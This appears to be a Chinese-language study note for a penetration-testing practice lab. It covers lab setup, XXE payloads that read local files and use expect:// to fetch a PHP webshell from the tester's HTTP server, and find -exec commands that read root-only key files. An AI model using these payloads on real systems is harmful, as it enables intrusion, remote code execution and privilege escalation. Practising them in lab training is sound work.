视频三前半段1:38:32



![](../../../../images/2aa0f2c8e078f4f50550dd1ed1c581e1.png)![](../../../../images/85bc514e32552c3c7c854e9a41a85a74.png)

# 环境
```bash
su root                    密码xbw
/etc/init.d/apache2 stop
cd test/ceshi
docker-compose up -d
```

# 流程
![](../../../../images/090465ec9b55d4c3ab7e9dc9e0f9aa5e.png)

```bash
https证书查看
 
 C:\Windows\System32\drivers\etc
192.168.147.130 www.cisp-pts.ya

http://www.cisp-pts.ya/manage/login.php

http://www.cisp-pts.ya/manage/setting.php抓包
将get转化为post，见图一
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE uuu [
<!ENTITY xxe SYSTEM "file:///etc/psswd" >]>
<config><title>&xxe;</title></config>


python -m SimpleHTTPServer 80      192.168.147.1


```

![](../../../../images/f56e1af21b3ce10e584a0f57bb9d39da.png)上图图一

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE uuu [
<!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'192.168.147.1/1.php'" >]>
<config><title>&xxe;</title></config>
```

连上webshell，查看上一级获得key7  
![](../../../../images/0bb9a8ad71b0fd4a26555da1b7f6a77d.png)![](../../../../images/dc4488dfa995b4585979b6d133555c34.png)

```bash
find /etc/passwd -exec whoami \;
find /etc/passwd -exec ls /root\;
find /etc/passwd -exec cat /root/key8.cisp \;
```

![](../../../../images/da44e7d1aaf780c9ac2fc8e38ac3a106.png)

